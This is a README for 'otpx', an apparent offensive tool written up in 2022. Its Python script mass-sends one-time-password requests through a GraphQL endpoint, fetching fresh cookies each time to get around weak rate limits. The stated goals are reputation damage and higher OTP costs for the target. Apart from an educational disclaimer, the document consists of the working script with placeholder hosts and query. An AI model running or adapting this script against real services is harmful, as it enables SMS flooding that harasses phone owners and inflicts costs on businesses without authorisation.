# otpx

> Austin Lai | November 11th, 2022

---

## Table of Contents

<!-- TOC -->

- [otpx](#otpx)
    - [Table of Contents](#table-of-contents)
    - [Disclaimer](#disclaimer)
    - [Description or Introduction](#description-or-introduction)
    - [otpx documentation](#otpx-documentation)

<!-- /TOC -->

<br />

## Disclaimer

This or previous tool is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (Austin) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears **NO** responsibility for content or misuse of these programs or any derivatives thereof. By using these programs you accept the fact that any damage (data loss, system crash, system compromise, etc.) caused by the use of these tools is not Austin responsibility.

<br />

## Description or Introduction

<!-- Description -->

**otpx** is a tool that anonymously mass sending OTP under GraphQL.

**Example showing only a sample of how we can exploit OTP under GraphQL and bypass inadequate rate-limit to demonstrate the impact of reputation damage and/or increase OTP cost.**

<!-- /Description -->

<br />

## otpx documentation

```python
#!/usr/bin/python

import json
import requests

# Here is where we retrieve new cookies set.
get_cookie = 'https://xxx.xxx.xxx/'

# Here is the OTP GraphQL endpoint
otp_url = 'https://xxx.xxx.xxx/sample-graphql/xxx'

# Here is where we define and craft our HTTP request headers
headers = {
    'Host': 'xxx.xxx.xxx',
    'Sec-Ch-Ua': '"Chromium";v="104", " Not A;Brand";v="99", "Microsoft Edge";v="104"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'https://xxx.xxx.xxx',
    'Referer': 'https://xxx.xxx.xxx',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9'
}

# Here is where we craft our graphql query
# You will need to find out the exact graphql query that suit in your environment.
body = '''
query sample($sample: String) { sample(sample: $sample) { sample sample }}
'''

# Here is where we define our random phone number that will be used to received OTP
phone = ['']


# Looping through list of phone and send OTP
for i in range(len(phone)):

    session = requests.Session()
    response = session.get(get_cookie)
    my_cookie=session.cookies.get_dict()

    response = requests.post(url=otp_url,cookies=my_cookie,json={'sample': 'sample','variables':{'sample':phone[i]},'query':body})

    if response.status_code == 200:
        print('response : ', response.content + b'\n')
```


